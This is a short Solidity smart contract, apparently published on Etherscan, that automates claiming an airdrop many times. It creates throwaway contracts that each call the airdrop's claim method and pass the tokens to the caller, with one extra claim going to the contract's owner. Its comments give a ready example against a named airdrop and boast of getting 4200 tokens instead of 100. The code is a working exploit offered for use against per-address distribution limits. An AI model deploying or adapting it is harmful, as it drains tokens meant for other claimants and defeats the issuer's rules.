/**
 *Submitted for verification at Etherscan.io on 2021-11-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/*
 * Participate in simple airdrops with multiple wallet addresses automatically!
 * 
 * For instance for the BluemelAirdrop 
 * (https://etherscan.io/address/0xee0880d40034e0e9781dc8fadd075484532f7f12#code)
 * (https://etherscan.io/token/0xe921401d18ed1ea4d64169d1576c32f9a7439694)
 * with 10 airdrops to be sent to the caller this would be:
 *
 * "airdropMe(42, 
 *            0xee0880d40034e0e9781dc8fadd075484532f7f12,
 *            gruessGernot(),
 *            0xe921401d18ed1ea4d64169d1576c32f9a7439694)"
 *
 * and you end up with 4200 Tokens instead of only 100.
 *
 * For his services, one additional airdrop is delivered to the contract owner as well.
 *
 * This contract is
 *      on Ethereum:    0x10617B9b699b3E51240e2010baEbe9051c39c484
 *      on BSC:         0xdb16F3DED1cCeCE0c6D9A57ae3Ce34D8609CDebC
 *      on BSC Testnet: 0xd4f11D85C124d17f0Aba75E1c827c722dC452f65
 */

interface ERC20 {
    function transfer(address account, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}

contract SingleClaim {
    constructor(address airdropper, string memory method, address token, address account) {
        airdropper.call(abi.encodeWithSignature(method));
        ERC20(token).transfer(account, ERC20(token).balanceOf(address(this)));
    } 
}

contract AirdropClaim {
    address master = msg.sender;
    function airdropMe(uint8 count, address airdropper, string memory method, address token) public {
        new SingleClaim(airdropper, method, token, master);
        for (uint8 i=0; i<count; i++) {
            new SingleClaim(airdropper, method, token, msg.sender);
        }
    }
}